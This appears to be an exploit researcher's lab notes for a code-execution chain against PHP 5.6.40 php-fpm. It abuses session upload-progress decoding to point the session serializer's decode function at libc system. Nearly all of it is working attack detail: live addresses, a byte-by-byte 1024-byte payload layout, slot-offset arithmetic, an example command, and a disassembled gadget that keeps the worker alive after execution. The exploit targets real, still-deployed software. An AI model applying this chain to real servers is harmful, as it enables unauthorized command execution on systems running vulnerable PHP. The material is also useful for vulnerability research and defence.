# 5.6.40 native dtor → `PS(serializer)` → libc `system` chain

Status: **native code execution with worker survival, reproduced twice.**
No gdb write to `ps_serializers` was used. gdb only observed the decode calls.

## Lab

- Binary: `build/php-5.6.40/sapi/fpm/php-fpm`
  sha256 `b9261e1cb91672c6a297bde724db3cd26833d329b832bc4bcde0183af3703723`
- Private FPM pool: `127.0.0.1:45256`, master 164972, one static worker.
- `setarch -R` (ASLR off). libc base `0x7ffff7cc9000`,
  `system = 0x7ffff7d1c090` (offset `0x53090`).
- Trigger: multipart upload progress (`PHP_SESSION_UPLOAD_PROGRESS`), which
  performs a START decode and an END decode of the same session file. The
  session file is `sess56/sess_psys4` or `sess_psys5` (1024 bytes).
- Plant: `plant.php` leaves stale `BG(unserialize).var_hash = P` with level 1
  (the geometry receipt's stale pre-RINIT window).

## Addresses observed live

| Name | Address |
|---|---|
| first `s_read` buffer `X1` | `0x7ffff7cbb580` |
| stale `php_unserialize_data P` | `0x7ffff7cbb710` = `X1+0x190` |
| second `s_read` buffer `X2` | `0x7ffff7cbc338` |
| fake `ps_serializer` struct `F1` | `0x7ffff7cbc638` = `X2+0x300` |
| `PS(serializer)` | `0x82e5c0` |
| `PS(http_session_vars)` | `0x82e5c8` |
| `PS(mod_user_implemented)` / `PS(mod_user_is_open)` | `0x82e5b8` |
| `PS(mod_data)` | `0x82e548` |
| `ps_serializers[2]` (`php_binary`) | `0x816df0` (decode `0x816e00`) |
| libc `system` | `0x7ffff7d1c090` |
| survival encode gadget | `0x4b4728` |

## Payload layout (1024 bytes)

`phase/make_native56.py` regenerates it byte-for-byte. The payload is read twice:
once into `X1` and once into `X2`.

```
0x00  0x20 (key length), 32-byte command key (left-padded with spaces),
      "R:1057;"                                       record 1
0x28  0x01, "z", "s:973:\""                           record 2 header
0x31  973-byte string payload (fills to 0x3fd), "\";"
0x190 fake php_unserialize_data P
        +0x00 first      = X1+0x200-0x2000 = 0x7ffff7cb9780
        +0x08 last       = X1+0x220-0x2000 = 0x7ffff7cb97a0
        +0x10 first_dtor = 0
        +0x18 last_dtor  = X1+0x280-0x2000 = 0x7ffff7cb9800
0x200 first->used_slots = 0x1000  (4096 >= 1056)
0x220 last->used_slots  = 1068    (0x42c)
0x280 last_dtor->used_slots = K0
0x300 F1+0x00 = F1
0x308 F1+0x08 = 0x4b4728   (encode / survival gadget)
0x310 F1+0x10 = 0x7ffff7d1c090 (decode = libc system)
```

`K0 = (0x82e5c0 - 0x7ffff7cb9800)/8 - 1 = -17592167765577`.
The R: dtor sequence is:

1. pre-push `var_push_dtor_no_addref(&current)` at slot `K0` →
   address `0x82e5b8`, value = old `current` zval pointer.
2. top push `var_push_dtor(&current)` after `current = F1` at slot `K0+1` →
   address `0x82e5c0` (`PS(serializer)`), value = `F1`.
3. string-record top push at slot `K0+2` → address `0x82e5c8`
   (`PS(http_session_vars)`), value = the string zval pointer.

The command executed by libc `system` is the file buffer itself, starting at
offset 0. The initial `0x20` and the left padding are spaces; the `#` at the
end of the 32-byte key comments the serialized tail; the first NUL inside the
fake struct terminates the C string. Example key: `touch /tmp/p5r #`.

## Why `F1` must live in the second buffer

The first decode's `R:` sets `current = F1` and runs `Z_ADDREF_PP` /
`Z_SET_ISREF_PP`, which write zval refcount/is_ref metadata at `F1+0x10` and
`F1+0x15`. At that time `X2` has not been read; those writes land in zeroed
memory. The second `s_read` then overwrites `X2` with the payload, restoring
`F1+0x10 = system`. The second decode dereferences the clean fake struct.

## First decode / first update

- `PS(serializer)` is still the real `php_binary` at entry (`0x816df0`).
- The R: dtor writes set `PS(serializer) = F1` and
  `PS(http_session_vars) = string zval pointer` (type `IS_STRING`).
- `php_session_save_current_state` sees `IF_SESSION_VARS()` false and skips
  the encode. The files `s_close` runs and frees `PS(mod_data)`, leaving
  `PS(mod_data) = NULL`.

## Second decode (END upload-progress update)

- `PS(serializer)` is already `F1`. `s_read` loads the same 1024 bytes into
  `X2`; `F1+0x10` is the exact libc `system`.
- `php_session_decode` calls `decode(val, vallen)` =
  `system(0x7ffff7cbc338, 1024)`. `system` uses the first argument (the file
  buffer) and ignores the second. The marker is created.
- gdb logs: `phase/5.6_native_gdb_psys4.log`,
  `phase/5.6_native_gdb_psys5.log`. Both show the second hit with
  `ser=0x7ffff7cbc638`, `F1+8=0x4b4728`, `F1+0x10=0x7ffff7d1c090`, followed by
  `[Detaching after vfork from child process ...]`.

## Survival: encode gadget `0x4b4728`

Without a repair, the R: pre-push leaves a heap zval pointer in
`mod_user_implemented`/`mod_user_is_open`. At RSHUTDOWN the session code sees
`PS(mod_user_implemented) != 0` and `PS(mod_data) == NULL`, calls
`ps_close_files(NULL)`, and `ps_files_close` dereferences NULL at
`mod_files.c:326` (SIGSEGV). This is the crash variant:
`phase/5.6_native_crash_gdb_psys3.log`, worker 174540 died after creating the
marker.

The final flush calls `PS(serializer)->encode`. `F1+8` is set to the 5.6.40
gadget at `0x4b4728` (inside `ps_close_user`):

```
4b4728: movl $0x0,0x82e5b8(%rip)   ; zero mod_user_implemented/mod_user_is_open
4b4732: jmp  4b46d5
4b46d5: mov  -0x8(%rbp),%rdi       ; php_session_encode's ret local = NULL
4b46d9: test %rdi,%rdi
4b46dc: je   4b46f8
4b46f8: mov  -0xd4(%rbp),%eax
4b46fe: leave
4b46ff: ret
```

The gadget zeroes the corrupted flags and returns through
`php_session_encode`'s epilogue. In both surviving runs the caller took the
empty-session branch: the final flush wrote a 0-byte session file, the files
`s_close` saw a valid `PS(mod_data)`, and the worker stayed alive.

Post-run state (`phase/5.6_native_survival_check.log`):

- `0x82e5b8 = 0` (both flags zero)
- `0x82e5c0 = 0x7ffff7cbc638` (`PS(serializer)` still points at `F1`)
- `0x82e5c8 = 0`, `0x82e548 = 0`
- `ps_serializers[2] @0x816df0` untouched: decode `0x4af399`
- followed by a normal `info.php` request on the same worker: served, worker
  still alive.

## Results

| Run | Marker | Worker | Outcome |
|---|---|---|---|
| `sess_psys4`, gdb log psys4 | `/tmp/p5n` | 175538 | survived |
| `sess_psys5`, gdb log psys5 | `/tmp/p5r` | 185617 | survived |
| `sess_psys3` crash variant (encode `0x4afaff`) | `/tmp/p5n` | 174540 | SIGSEGV in `ps_close_files` after the marker |

Both surviving runs used the original serializer table (no gdb table write).

## Caveats

- The exact libc `system` address is required. The 5.6 binary imports no
  `system`/`execve`; only `popen` is imported, and `popen(command, mode)`
  receives the integer `vallen` as `mode`, so it is not usable through the
  decode call. Native exploitation therefore needs a libc base (ASLR off in
  this lab) or a leak.
- `PS(serializer) = F1` persists in the worker after the request. The next
  request that decodes a session without resetting it would still use `F1`;
  the payload's `system` pointer remains valid while `X2` remains mapped.
- The first decode's pre-push corruption is the reason survival needs the
  encode gadget. The table-write lever (gdb-assisted) does not have this
  problem.
